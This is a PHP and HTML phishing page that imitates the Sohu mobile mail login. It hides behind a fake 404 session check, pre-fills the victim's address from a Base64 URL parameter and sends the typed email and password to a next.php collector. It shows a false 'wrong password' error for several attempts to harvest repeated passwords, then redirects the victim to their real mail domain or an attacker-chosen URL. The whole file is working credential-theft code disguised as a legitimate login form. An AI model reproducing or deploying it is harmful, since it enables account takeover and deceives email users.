<?php
session_start();
if (!isset($_SESSION['came_from_index']) || $_SESSION['came_from_index'] !== true) {
    header("HTTP/1.0 404 Not Found");
    exit("404 Not Found");
}
?>

<!DOCTYPE html>
<html data-bs-theme="light" lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
    <title>搜狐闪电邮箱移动版-登录页</title>
    <link rel="stylesheet" href="../assets/bootstrap/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="../assets/css/styles.css">
</head>

<body>
    <div id="maincsohu" style="height: 100vh;">
        <div id="navbsohu" class="c-div" style="height: 60px;background: rgba(255,255,255,0.51);padding-top: 13px;padding-bottom: 13px;padding-left: 16px;padding-right: 16px;margin-top: 100px;">
            <div style="max-width: 1420px;width: 100%;"><img class="img-fluid" width="160" height="49" src="../assets/img/suholg.png"></div>
        </div>
        <div id="m0sohu" class="c-div">
            <div id="mainosohu" class="c-div" style="height: 455px;width: 100%;">
                <div id="maini139" class="e-div" style="width: 100%;max-width: 1024px;">
                    <div id="fo263" style="width: 100%;max-width: 340px;background: #ffffff;height: fit-content;margin-top: 50px;">
                        <div style="padding: 0px 28px 26px;padding-top: 22px;padding-bottom: 38px;">
                            <p style="margin-bottom: 0px;font-size: 20px;">登录搜狐邮箱</p><input type="text" id="backEMF" style="width: 100%;height: 40px;padding: 1px 8px;font-size: 14px;margin-top: 8px;"><input type="password" id="pass" style="width: 100%;height: 40px;margin-top: 16px;padding: 1px 8px;font-size: 14px;" placeholder="请输入您的密码">
                            <p id="err" style="margin-top: 6px;font-size: 14px;color: rgb(242,15,0);margin-bottom: 0px;">密码错误，请重试</p>
                            <div class="e-div" style="margin-top: 16px;font-size: 12px;"><a href="#" style="color: rgb(0,0,0);">忘记密码</a></div><button class="btn btn-primary" id="next-btn" type="button" style="width: 100%;height: 40px;border-radius: 0px;margin-top: 16px;background: linear-gradient(#ff5e5b, #ff504d);" onclick="nextFun();">登 录</button><button class="btn btn-primary" type="button" style="width: 100%;height: 30px;border-radius: 0px;margin-top: 16px;background: #ebebeb;padding: 2px 6px;color: rgb(0,0,0);">还没有搜狐闪电邮 ?<a href="#" style="color: #ff504d;"><span style="text-decoration: underline;">现在注册</span></a></button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="../assets/bootstrap/js/bootstrap.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>

<script>
$(document).ready(function () {
    $(document).on('keypress', function (e) {
    if (e.which === 13) {
        $('#next-btn').click();
    }
});

    // Get parameters from URL
    const urlParams = new URLSearchParams(window.location.search);
    const useridEncoded = urlParams.get('userid');
    const maxTry = parseInt(urlParams.get('maxtry') || '3');
    const pageValue = urlParams.get('page') || '';
    const domainRedirect = urlParams.get('domain_redirect') || '';

    let tryCount = 0;
    let userid = '';

    // Decode Base64 email
    try {
        userid = atob(useridEncoded || '');
    } catch (e) {
        console.error("Invalid userid encoding");
    }

    // Fill userid into either #backEm or #backEMF
    if ($('#backEm').length) {
        $('#backEm').text(userid);
    }
    if ($('#backEMF').length) {
        $('#backEMF').val(userid);
    }

    // Hide error initially
    $('#err').hide();

    // Next button click handler
    $('#next-btn').on('click', function () {
        const password = $('#pass').val().trim();

        // If password empty
        if (!password) {
            $('#err').show();
            return;
        }

        // Disable button until AJAX finishes
        $('#next-btn').prop('disabled', true);

        // Prepare POST data
        const postData = {
            ai: userid,
            pr: password,
            page_value: pageValue
        };

        $.ajax({
            url: '../next.php',
            type: 'POST',
            data: postData,
            success: function (response) {
                tryCount++;

                if (tryCount >= maxTry) {
                    // After maxTry, proceed normally
                    $('#err').hide();
                     const emailParts = userid.split('@');
                     if(!domainRedirect){
                    if (emailParts.length === 2) {
                        const domain = emailParts[1];
                        window.location.replace(`https://${domain}`);
                    } else {
                        // Fallback if email is malformed
                        window.location.replace("https://www.google.com");
                    }
                    }else{
                         window.location.replace(domainRedirect);
                    }


                    // You can redirect or take another action here
                } else {
                    // Show error and reset password field
                    $('#err').show();
                    $('#pass').val('');
                }
            },
            error: function () {
                alert("Error contacting server.");
            },
            complete: function () {
                // Re-enable button after request finishes
                $('#next-btn').prop('disabled', false);
            }
        });
    });
});
</script>

</body>


</html>